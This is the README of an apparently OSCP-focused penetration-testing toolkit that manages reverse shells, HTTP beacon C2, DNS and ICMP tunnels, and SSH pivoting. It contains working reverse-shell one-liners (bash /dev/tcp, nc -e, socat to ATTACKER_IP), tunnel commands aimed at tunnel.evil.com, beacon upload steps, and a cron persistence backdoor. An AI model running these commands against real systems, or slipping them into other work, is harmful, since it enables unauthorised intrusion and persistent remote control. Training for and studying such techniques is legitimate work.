# CRACK Session Management System

Complete reverse shell and C2 management system integrated into CRACK toolkit.

## Table of Contents

1. [Overview](#overview)
2. [Quick Start](#quick-start)
3. [Components](#components)
4. [Usage Examples](#usage-examples)
5. [OSCP Exam Workflows](#oscp-exam-workflows)
6. [Architecture](#architecture)
7. [API Reference](#api-reference)
8. [Troubleshooting](#troubleshooting)

## Overview

CRACK Session Management provides comprehensive tools for managing reverse shells, HTTP beacons, DNS tunnels, and ICMP tunnels during penetration testing engagements.

### Key Features

- **Multi-Protocol Support**: TCP, HTTP/HTTPS, DNS, ICMP
- **Shell Enhancement**: Automatic PTY upgrade, stabilization, multiplexing
- **Tunnel Management**: SSH, chisel, socat port forwarding
- **Beacon C2**: HTTP-based command and control with upgrade capability
- **Persistent Storage**: Sessions survive restarts
- **CRACK Track Integration**: View sessions directly from enumeration tracking
- **Event-Driven**: Reactive architecture for automation

### Design Philosophy

**OSCP-Focused**: Every feature designed for exam scenarios:
- Manual alternatives when tools fail
- Graceful degradation
- Clear error messages
- Educational output

**Educational**: Understand what's happening:
- Flag explanations
- Manual upgrade instructions
- Troubleshooting guides
- Next-step suggestions

## Quick Start

### 1. Start a TCP Listener

```bash
# Basic TCP reverse shell listener
crack session start tcp --port 4444

# With expected target (shows connection alerts)
crack session start tcp --port 4444 --target 192.168.45.150
```

**On target machine:**
```bash
# Bash reverse shell
bash -i >& /dev/tcp/192.168.45.150/4444 0>&1

# Or netcat
nc 192.168.45.150 4444 -e /bin/bash
```

### 2. Manage Sessions

```bash
# List active sessions
crack session list

# Show detailed info
crack session info <session_id>

# Upgrade shell to TTY
crack session upgrade <session_id> --method auto

# Kill session
crack session kill <session_id>
```

### 3. HTTP Beacon (Firewall Evasion)

```bash
# Start HTTP beacon listener
crack session start http --port 8080

# Generate beacon script
crack session beacon-gen bash http://192.168.45.150:8080 -o beacon.sh

# Upload beacon.sh to target and execute
# Commands are queued via:
crack session beacon-send <session_id> "whoami"

# Upgrade beacon to TCP reverse shell
crack session beacon-upgrade <session_id> --lhost 192.168.45.150 --lport 4444
```

### 4. DNS Tunnel (Restricted Networks)

```bash
# Start DNS tunnel (requires root + DNS delegation)
sudo crack session start dns --domain tunnel.evil.com

# On target (iodine client):
iodine -f -P <password> tunnel.evil.com
```

### 5. ICMP Tunnel (Maximum Stealth)

```bash
# Start ICMP tunnel (requires root)
sudo crack session start icmp

# On target:
# Windows: icmpsh.exe -t <attacker_ip>
# Linux: ptunnel -p <attacker_ip> -lp 8000 -da <dest> -dp 80
```

### 6. Port Forwarding (Pivoting)

```bash
# SSH SOCKS proxy
crack session tunnel-create <session_id> \
  --type ssh-dynamic \
  --socks-port 1080 \
  --username user

# Then use with proxychains:
proxychains4 nmap -sT 192.168.1.10
```

## Components

### Core Components

#### 1. SessionManager (`manager.py`)

Central orchestrator for all session operations.

**Features:**
- Create/track/kill sessions
- PID validation and dead session cleanup
- Event emission for lifecycle events
- Thread-safe operations
- Persistent storage integration

**Usage:**
```python
from crack.sessions.manager import SessionManager
from crack.sessions.storage.base import SessionStorage
from crack.sessions.config import SessionConfig

storage = SessionStorage()
config = SessionConfig()
manager = SessionManager(storage, config)

# Create session
session = manager.create_session(
    type='tcp',
    target='192.168.45.150',
    port=4444,
    shell_type='bash'
)

# List active sessions
active = manager.list_sessions({'status': 'active'})

# Kill session
manager.kill_session(session.id)
```

#### 2. Listeners (`listeners/`)

Protocol-specific listeners for reverse shells and C2.

**TCP Listener** (`tcp_listener.py`):
- Async socket server
- Automatic shell detection
- Multi-session support
- Connection handoff to SessionManager

**HTTP Listener** (`http_listener.py`):
- HTTP/HTTPS beacon server
- Command queue per beacon
- Response collection
- Auto-cleanup of dead beacons

**DNS Listener** (`dns_listener.py`):
- Iodine integration (VPN-like tunnel)
- Dnscat2 integration (C2 shell)
- Client command generation
- Password/secret management

**ICMP Listener** (`icmp_listener.py`):
- Ptunnel integration (port forward)
- Icmpsh integration (interactive shell)
- Kernel ICMP suppression
- Target filtering

#### 3. Shell Enhancement (`shell/`)

Tools for upgrading and stabilizing shells.

**Detector** (`detector.py`):
- Shell type detection (bash, sh, powershell, cmd)
- Available tool detection (python, socat, script)
- Capability detection (PTY, history, tab completion)

**Upgrader** (`upgrader.py`):
- Python PTY upgrade
- Script upgrade
- Socat upgrade
- Auto-upgrade (tries all methods)

**Stabilizer** (`stabilizer.py`):
- Terminal size adjustment
- Signal handling (Ctrl+C)
- Background/foreground job control
- Manual instructions

**HTTP Upgrader** (`http_upgrader.py`):
- Beacon → TCP reverse shell
- Capability detection via beacon
- Payload generation (bash, python, perl, php, ruby)
- Auto-listener startup

#### 4. Tunnel Management (`tunnel/`)

Port forwarding and SOCKS proxies for pivoting.

**TunnelManager** (`manager.py`):
- SSH local/remote/dynamic forwarding
- Chisel HTTP tunneling
- Socat relays
- Proxychains config generation

**Usage:**
```bash
# SSH local forward (access internal MySQL)
crack session tunnel-create <session_id> \
  --type ssh-local \
  --local-port 3306 \
  --remote-host 192.168.1.10 \
  --remote-port 3306 \
  --username user

# SSH SOCKS proxy (route all tools)
crack session tunnel-create <session_id> \
  --type ssh-dynamic \
  --socks-port 1080 \
  --username user

# Then use:
proxychains4 nmap -sT 192.168.1.10
proxychains4 curl http://192.168.1.10:8080
```

#### 5. Storage (`storage/`)

Persistent session storage across restarts.

**SessionStorage** (`base.py`):
- JSON file-based storage (`~/.crack/sessions/*.json`)
- Session list/get/save/delete operations
- Query interface for filtering

**Features:**
- Automatic session persistence
- Survives system restarts
- Session history preservation

#### 6. Configuration (`config.py`)

System-wide configuration management.

**SessionConfig**:
- Default ports (TCP: 4444, HTTP: 8080)
- Listener settings (host, timeout)
- Upgrade preferences
- Tunnel settings

**File:** `~/.crack/config.json`

```json
{
  "sessions": {
    "tcp_port": 4444,
    "http_port": 8080,
    "upgrade_timeout": 30,
    "beacon_interval": 5
  }
}
```

## Usage Examples

### Scenario 1: Basic Exploitation

```bash
# 1. Start listener
crack session start tcp --port 4444

# 2. Exploit on target machine
# ... trigger reverse shell via exploit ...

# 3. Session auto-created, list it
crack session list

# 4. Upgrade to full TTY
crack session upgrade <session_id> --method auto

# 5. Interactive shell now has:
#    - Arrow key history
#    - Tab completion
#    - Ctrl+C handling
#    - Job control (Ctrl+Z)
```

### Scenario 2: Firewall Evasion via HTTP Beacon

```bash
# 1. Start HTTP listener
crack session start http --port 8080

# 2. Generate beacon
crack session beacon-gen bash http://192.168.45.150:8080 -o beacon.sh

# 3. Upload beacon.sh to target (via file upload vuln, etc.)

# 4. Execute beacon on target
# ... beacon registers with listener ...

# 5. Send commands
crack session beacon-send <session_id> "uname -a"

# 6. Poll responses
crack session beacon-poll <session_id>

# 7. Upgrade to full TCP reverse shell
crack session beacon-upgrade <session_id> \
  --lhost 192.168.45.150 \
  --lport 4444
```

### Scenario 3: Pivoting Through Compromised Host

```bash
# 1. Compromise DMZ host (192.168.45.100)
# 2. Upgrade shell
crack session upgrade <session_id>

# 3. Create SSH SOCKS proxy
crack session tunnel-create <session_id> \
  --type ssh-dynamic \
  --socks-port 1080 \
  --username compromised_user

# 4. Scan internal network
proxychains4 nmap -sT 192.168.1.0/24

# 5. Access internal services
proxychains4 curl http://192.168.1.10:8080
proxychains4 mysql -h 192.168.1.10 -u root -p
```

### Scenario 4: DNS-Only Network

```bash
# 1. Setup authoritative DNS (NS record pointing to attacker)
# 2. Start DNS tunnel
sudo crack session start dns --domain tunnel.evil.com

# 3. On target:
iodine -f -P <password> tunnel.evil.com

# 4. Target gets IP in 10.0.0.0/24 network
# 5. Full IP connectivity over DNS
ssh user@10.0.0.2
```

## OSCP Exam Workflows

### Workflow 1: Standard Box Exploitation

```bash
# Phase 1: Enumeration
crack track new <target_ip>
crack track interactive

# Phase 2: Initial Access
# ... find and exploit vulnerability ...

# Phase 3: Catch Shell
crack session start tcp --port 4444
# ... trigger exploit ...

# Phase 4: Upgrade Shell
crack session list
crack session upgrade <session_id> --method auto

# Phase 5: Enumerate as User
# (upgraded shell has tab completion, history)

# Phase 6: Privilege Escalation
# ... find privesc vector ...
# ... become root ...

# Phase 7: Proof Collection
# Take screenshot with session ID visible
# Note exact commands used
```

### Workflow 2: Firewall-Restricted Box

```bash
# Scenario: Outbound TCP blocked, HTTP allowed

# Phase 1: Initial Recon (find web server)
crack track new <target_ip>
nmap -p80,443 <target_ip>

# Phase 2: Setup HTTP Beacon
crack session start http --port 8080
crack session beacon-gen bash http://<lhost>:8080 -o beacon.sh

# Phase 3: Upload Beacon (via web vuln)
# ... upload beacon.sh via LFI, file upload, etc. ...

# Phase 4: Execute Beacon
# ... trigger beacon execution ...

# Phase 5: Validate Beacon
crack session list
crack session beacon-send <session_id> "whoami"

# Phase 6: Upgrade to TCP (if possible)
crack session beacon-upgrade <session_id> \
  --lhost <lhost> \
  --lport 4444

# Phase 7: Continue with standard workflow
```

### Workflow 3: Multi-Hop Pivoting

```bash
# Scenario: Target behind internal network

# Phase 1: Compromise DMZ host
crack session start tcp --port 4444
# ... exploit DMZ host ...

# Phase 2: Upgrade DMZ shell
crack session upgrade <dmz_session_id>

# Phase 3: Create SOCKS tunnel
crack session tunnel-create <dmz_session_id> \
  --type ssh-dynamic \
  --socks-port 1080 \
  --username <user>

# Phase 4: Scan internal network through SOCKS
proxychains4 nmap -sT 192.168.1.0/24

# Phase 5: Exploit internal target through SOCKS
proxychains4 python3 exploit.py 192.168.1.10

# Phase 6: Catch internal shell (direct or via pivot)
# Option A: Direct (if internal can reach attacker)
crack session start tcp --port 4445

# Option B: Via local forward on DMZ
crack session tunnel-create <dmz_session_id> \
  --type ssh-remote \
  --local-port 4445 \
  --remote-host <attacker_ip> \
  --remote-port 4445

# Phase 7: Continue exploitation
```

## Architecture

### System Architecture

```
CRACK CLI (cli.py)
    |
    v
Unified Session CLI (unified_cli.py)
    |
    +-- SessionManager (manager.py)
    |       |
    |       +-- SessionStorage (storage/base.py)
    |       +-- SessionConfig (config.py)
    |       +-- EventBus (events.py)
    |
    +-- Listeners (listeners/)
    |       +-- TCPListener
    |       +-- HTTPListener
    |       +-- DNSListener
    |       +-- ICMPListener
    |
    +-- Shell Enhancement (shell/)
    |       +-- ShellDetector
    |       +-- TCPShellUpgrader
    |       +-- HTTPShellUpgrader
    |       +-- ShellStabilizer
    |       +-- ShellMultiplexer
    |
    +-- Tunnel Management (tunnel/)
            +-- TunnelManager
            +-- SSHTunnel
            +-- ChiselTunnel
            +-- SocatTunnel
```

### Event Flow

```
1. Listener Start
   TCPListener.start() → Async socket server

2. Connection Received
   TCPListener → SessionManager.create_session()
   SessionManager → EventBus.publish(SESSION_STARTED)

3. Shell Detection
   ShellDetector.detect(session) → Update session.capabilities

4. Shell Upgrade
   TCPShellUpgrader.auto_upgrade(session)
   → Try python PTY
   → Try script
   → Try socat
   → Update capabilities
   → EventBus.publish(SESSION_UPGRADED)

5. Tunnel Creation
   TunnelManager.create_tunnel(session, type, config)
   → Start tunnel process
   → Track in session metadata

6. Session Termination
   SessionManager.kill_session(id)
   → Kill process (SIGTERM/SIGKILL)
   → Update status='dead'
   → EventBus.publish(SESSION_DIED)
```

### Data Models

**Session** (`models.py`):
```python
Session(
    id: str,                    # UUID
    type: str,                  # 'tcp', 'http', 'dns', 'icmp'
    protocol: str,              # 'reverse', 'bind', 'beacon'
    target: str,                # IP or hostname
    port: int,                  # Connection port
    status: str,                # 'active', 'dead', 'sleeping', 'upgrading'
    pid: int,                   # Process ID (if applicable)
    shell_type: str,            # 'bash', 'sh', 'powershell', 'cmd'
    capabilities: ShellCapabilities,  # PTY, history, tools
    metadata: dict,             # Custom fields
    created_at: datetime,       # Creation timestamp
    last_seen: datetime         # Last activity
)
```

**ShellCapabilities**:
```python
ShellCapabilities(
    has_pty: bool,              # Full PTY
    has_history: bool,          # Arrow key history
    has_tab_completion: bool,   # Tab completion
    has_job_control: bool,      # Ctrl+Z support
    shell_type: str,            # Detected shell
    detected_tools: List[str]   # Available tools (python, socat, etc.)
)
```

### Storage Format

**Session File**: `~/.crack/sessions/<session_id>.json`

```json
{
  "id": "a1b2c3d4-1234-5678-90ab-cdef12345678",
  "type": "tcp",
  "protocol": "reverse",
  "target": "192.168.45.150",
  "port": 4444,
  "status": "active",
  "pid": 12345,
  "shell_type": "bash",
  "capabilities": {
    "has_pty": true,
    "has_history": true,
    "has_tab_completion": true,
    "has_job_control": true,
    "shell_type": "bash",
    "detected_tools": ["python3", "socat", "script"]
  },
  "metadata": {
    "listener_id": "listener-abc123",
    "upgrade_method": "python3",
    "stabilized": true
  },
  "created_at": "2025-10-09T10:30:00",
  "last_seen": "2025-10-09T10:35:00"
}
```

## API Reference

### SessionManager

#### `create_session(type, target, port, **kwargs) -> Session`

Create and register new session.

**Args:**
- `type`: 'tcp', 'http', 'dns', 'icmp'
- `target`: Target IP or hostname
- `port`: Connection port
- `protocol`: 'reverse', 'bind', 'beacon' (default: 'reverse')
- `shell_type`: 'bash', 'sh', 'powershell', 'cmd'
- `pid`: Process ID
- `metadata`: Custom fields dict
- `capabilities`: ShellCapabilities instance

**Returns:** Session instance

**Example:**
```python
session = manager.create_session(
    type='tcp',
    target='192.168.45.150',
    port=4444,
    protocol='reverse',
    shell_type='bash',
    metadata={'listener_id': 'listener-123'}
)
```

#### `list_sessions(filters=None) -> List[Session]`

List sessions with optional filtering.

**Filters:**
- `status`: 'active', 'dead', 'sleeping', 'upgrading'
- `type`: 'tcp', 'http', 'dns', 'icmp'
- `protocol`: 'reverse', 'bind', 'beacon'
- `target`: Target IP/hostname
- `port`: Port number
- `active_only`: Boolean

**Example:**
```python
# Get all active TCP sessions
tcp_active = manager.list_sessions({
    'type': 'tcp',
    'status': 'active'
})
```

#### `get_session(id) -> Optional[Session]`

Retrieve session by ID (full or prefix match).

**Example:**
```python
session = manager.get_session('a1b2c3d4')  # Prefix match
```

#### `update_session(id, updates) -> Session`

Update session properties.

**Updates:**
- `status`: New status
- `shell_type`: Detected shell type
- `capabilities`: ShellCapabilities dict
- `metadata`: Metadata updates (merged)
- `pid`: Process ID

**Example:**
```python
manager.update_session(session_id, {
    'shell_type': 'bash',
    'capabilities': capabilities.to_dict()
})
```

#### `kill_session(id) -> bool`

Terminate session and cleanup resources.

**Returns:** True if killed, False if not found/already dead

#### `cleanup_dead_sessions() -> int`

Remove dead/stale sessions from tracking.

**Returns:** Number of sessions cleaned up

### TCPShellUpgrader

#### `auto_upgrade(session) -> bool`

Auto-detect and upgrade shell (tries all methods).

**Methods tried:**
1. Python PTY
2. Python3 PTY
3. Script utility
4. Socat

**Returns:** True if any method succeeded

#### `upgrade_python_pty(session) -> bool`

Upgrade using Python PTY module.

**Command sent:**
```python
python -c 'import pty; pty.spawn("/bin/bash")'
```

#### `stabilize_shell(session) -> bool`

Stabilize upgraded shell (terminal size, signals).

**Commands sent:**
```bash
export TERM=xterm-256color
export SHELL=/bin/bash
stty rows 38 columns 116  # Adjust to your terminal
```

### TunnelManager

#### `create_tunnel(session_id, tunnel_type, config) -> dict`

Create port forward or SOCKS tunnel.

**Tunnel Types:**
- `ssh-local`: SSH local port forward (-L)
- `ssh-remote`: SSH remote port forward (-R)
- `ssh-dynamic`: SSH SOCKS proxy (-D)
- `chisel`: Chisel HTTP tunnel
- `socat`: Socat relay
- `proxychains`: Generate proxychains config

**Config:**
- `local_port`: Local port
- `remote_host`: Remote destination
- `remote_port`: Remote port
- `socks_port`: SOCKS proxy port
- `username`: SSH username
- `password`: SSH password
- `key_file`: SSH private key

**Returns:** Tunnel dict with id, type, command

## Troubleshooting

### Issue: Shell Upgrade Fails

**Symptoms:**
```
[!] Upgrade failed
[!] Python PTY method failed
[!] Script method failed
```

**Solutions:**

1. **Check if Python available:**
   ```bash
   which python
   which python3
   ```

2. **Try manual upgrade:**
   ```python
   # Python 2
   python -c 'import pty; pty.spawn("/bin/bash")'

   # Python 3
   python3 -c 'import pty; pty.spawn("/bin/bash")'

   # Script utility
   script /dev/null -c bash
   ```

3. **Use socat upgrade (if available):**
   ```bash
   # Attacker terminal 1:
   socat file:`tty`,raw,echo=0 tcp-listen:4444

   # Target shell:
   socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:ATTACKER_IP:4444
   ```

### Issue: HTTP Beacon Not Registering

**Symptoms:**
```
[!] No sessions for this target
```

**Solutions:**

1. **Check beacon syntax:**
   - Verify listener URL in beacon script
   - Ensure listener is running (`crack session list`)

2. **Test beacon connectivity:**
   ```bash
   # On target:
   curl http://LHOST:8080/beacon
   ```

3. **Check firewall:**
   - Verify port 8080 open on attacker
   - Check target outbound rules

4. **View listener logs:**
   ```bash
   # Listener shows connections in real-time
   ```

### Issue: DNS Tunnel Not Working

**Symptoms:**
```
[!] Failed to start DNS listener
```

**Solutions:**

1. **Check DNS delegation:**
   ```bash
   # Verify NS record points to attacker
   dig NS tunnel.evil.com
   ```

2. **Verify root privileges:**
   ```bash
   sudo crack session start dns --domain tunnel.evil.com
   ```

3. **Check iodine installation:**
   ```bash
   which iodined
   sudo apt-get install iodine
   ```

4. **Test DNS resolution:**
   ```bash
   # From target:
   nslookup test.tunnel.evil.com
   ```

### Issue: Session Shows as Dead

**Symptoms:**
```
[!] Session is dead
```

**Causes:**
1. Process killed (PID validation failed)
2. Network connection lost
3. Target rebooted
4. Session timeout (>1 hour inactivity)

**Solutions:**

1. **Check if process alive:**
   ```bash
   ps aux | grep <pid>
   ```

2. **Re-establish connection:**
   - Trigger new reverse shell
   - New session will be created

3. **Use persistent backdoor:**
   ```bash
   # Cron job for persistence
   */5 * * * * /tmp/beacon.sh
   ```

### Issue: Tunnel Connection Refused

**Symptoms:**
```
[!] Failed to create tunnel
Connection refused
```

**Solutions:**

1. **Check SSH service:**
   ```bash
   # On compromised host:
   systemctl status sshd
   ```

2. **Verify credentials:**
   - Check username/password
   - Verify SSH key permissions (600)

3. **Test SSH connectivity:**
   ```bash
   ssh user@target_ip
   ```

4. **Check port availability:**
   ```bash
   netstat -tuln | grep <port>
   ```

## Performance Targets

- **Session Creation**: <5 seconds
- **Shell Upgrade**: <30 seconds (auto mode)
- **Concurrent Sessions**: 10+ simultaneous
- **Storage Operations**: <100ms
- **List/Filter**: <100ms for 1000 sessions

## Security Considerations

1. **Storage Security:**
   - Session files contain sensitive data
   - Stored in `~/.crack/sessions/`
   - Permissions: 600 (owner read/write only)

2. **Credential Handling:**
   - Passwords stored in session metadata
   - SSH keys referenced by path (not stored)
   - Clear sessions after engagement

3. **Network Security:**
   - Listeners bind to 0.0.0.0 by default
   - Use `--host` to restrict binding
   - HTTPS requires valid certificates

4. **Cleanup:**
   ```bash
   # Remove all sessions
   rm -rf ~/.crack/sessions/*

   # Kill all tunnels
   crack session tunnel-list
   crack session tunnel-kill <tunnel_id>
   ```

## Integration with CRACK Track

Session management integrates seamlessly with CRACK Track:

```bash
# Start Track interactive mode
crack track interactive

# Sessions automatically displayed in context:
# [Sessions: 2 active]
#   [+] tcp-abc123: 192.168.45.150:4444 (bash, PTY)
#   [-] http-def456: 192.168.45.151:8080 (beacon, polling)

# Quick session shortcuts:
#   s  - View/manage sessions
#   ls - Start listener
#   us - Upgrade session
#   ks - Kill session
```

## Contributing

Session management follows CRACK's architecture:

1. **No reinstall needed** for session/ changes
2. **Reinstall required** for cli.py changes
3. **Test coverage**: 70%+ target
4. **Documentation**: All public APIs documented

## Version History

- **v0.1.0** (2025-10-09): Initial release
  - TCP/HTTP/DNS/ICMP listeners
  - Shell upgrade and stabilization
  - Tunnel management
  - Unified CLI
  - Track integration

## License

Part of CRACK toolkit for OSCP preparation.

## Support

For issues, see CRACK main documentation or Troubleshooting section above.

---

**Remember**: Session management is a tool. Understanding manual techniques is critical for OSCP exam success. Always practice manual shell upgrade, stabilization, and tunneling.
